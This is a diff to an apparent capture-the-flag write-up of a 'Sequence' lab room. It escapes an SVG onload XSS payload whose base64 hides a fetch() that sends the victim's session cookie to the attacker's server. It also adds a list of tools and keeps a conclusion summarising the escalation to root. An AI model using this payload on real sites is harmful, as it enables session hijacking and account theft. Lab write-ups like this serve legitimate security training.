@@ -49,7 +49,7 @@ python3 -m http.server 80
 
 We submitted a base64-encoded SVG payload in the contact form’s message field to bypass basic filters:
 ```html
-<svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC40OC44MC45MC8/Yz0nICsgZG9jdW1lbnQuY29va2llKQ=='))">
+&lt;svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC40OC44MC45MC8/Yz0nICsgZG9jdW1lbnQuY29va2llKQ=='))"&gt;
 ```
 
 The moderator bot visited our submission, and our server received a request containing their session cookie:
@@ -125,6 +125,14 @@ cat /mnt/root/flag.txt
 ```
 
 ![Root Flag](assets/screenshots/sequence/flag3.png)
+
+## Tools Used
+- Nmap
+- FFUF
+- Netcat
+- Curl
+- Browser DevTools
+- Python HTTP Server
 
 ## Conclusion
 The Sequence room perfectly demonstrates how chained vulnerabilities can lead to complete system compromise. A single leaked text file provided the foundation, while a missing `HttpOnly` flag allowed session hijacking via XSS. From there, weak CSRF tokens allowed privilege escalation, and parameter tampering exposed an internal upload panel. Finally, a misconfigured Docker socket provided a trivial escape to root.
